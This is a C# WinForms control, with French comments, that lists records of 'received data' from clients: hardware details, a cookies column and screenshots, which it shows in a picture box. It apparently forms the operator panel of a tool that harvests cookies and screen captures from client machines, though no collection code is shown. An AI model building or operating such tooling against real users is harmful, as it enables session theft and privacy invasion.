using System;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace ServerTest
{
    public partial class viewData : UserControl
    {
        private static viewData view;

        SqlConnection cnx;
        SqlDataAdapter adapter;
        DataTable dataTable;
        SqlDataReader reader;

        public static viewData Instance
        {
            get
            {
                if (view == null)
                {
                    view = new viewData();
                }
                return view;
            }
        }

        public viewData()
        {
            InitializeComponent();
        }

        private void viewData_Load(object sender, EventArgs e)
        {
            try
            {
                // Connexion à la base de données
                cnx = Program.GetSqlConnection();
                cnx.Open();

                // Récupération des données depuis la base de données
                adapter = new SqlDataAdapter("SELECT * FROM receivedData1", cnx);
                dataTable = new DataTable();
                adapter.Fill(dataTable);

                // Renommer les colonnes dans le DataTable (remplacement des noms)
                dataTable.Columns[0].ColumnName = "ID Data";
                dataTable.Columns[1].ColumnName = "Client ID";
                dataTable.Columns[2].ColumnName = "OS";
                dataTable.Columns[3].ColumnName = "MotherBoard";
                dataTable.Columns[4].ColumnName = "Procsseur";
                dataTable.Columns[5].ColumnName = "RAM";
                dataTable.Columns[6].ColumnName = "Hard Disk";
                dataTable.Columns[8].ColumnName = "Cookies";
                dataTable.Columns[9].ColumnName = "Reiceved At";

                // Lier le DataTable au DataGridView
                data_dgv.DataSource = dataTable;

                // Cacher la colonne 7 (Capture d'écran)
                data_dgv.Columns[7].Visible = false;

                cnx.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Erreur lors du chargement des données : " + ex.Message);
            }
        }



        private void data_dgv_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void data_dgv_CellClick_1(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex >= 0)
            {
                // Récupération de l'ID de la photo depuis la colonne 0
                int idPhoto = Convert.ToInt32(data_dgv.Rows[e.RowIndex].Cells[0].Value);

                // Récupération de l'image correspondant à l'ID de la photo
                string selectQuery = "SELECT captureData FROM receivedData1 WHERE idData = @idPhoto";

                // Connexion à la base de données
                using (cnx = Program.GetSqlConnection())
                {
                    cnx.Open();

                    // Création de la commande SQL
                    using (SqlCommand cmd = new SqlCommand(selectQuery, cnx))
                    {
                        // Paramètre pour l'ID de la photo
                        cmd.Parameters.AddWithValue("@idPhoto", idPhoto);

                        // Exécution de la commande et récupération du résultat
                        using (reader = cmd.ExecuteReader())
                        {
                            if (reader.Read())
                            {
                                // Vérification si la colonne captureData n'est pas NULL
                                if (!reader.IsDBNull(0))
                                {
                                    // Récupération des données binaires de l'image
                                    byte[] imageBytes = (byte[])reader[0];

                                    // Conversion des données binaires en image
                                    using (MemoryStream ms = new MemoryStream(imageBytes))
                                    {
                                        Image image = Image.FromStream(ms);

                                        // Affichage de l'image dans un PictureBox
                                        imgbox.Image = image;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        private void btn_refresh_Click(object sender, EventArgs e)
        {
            viewData_Load(sender, e);
        }
    }
}
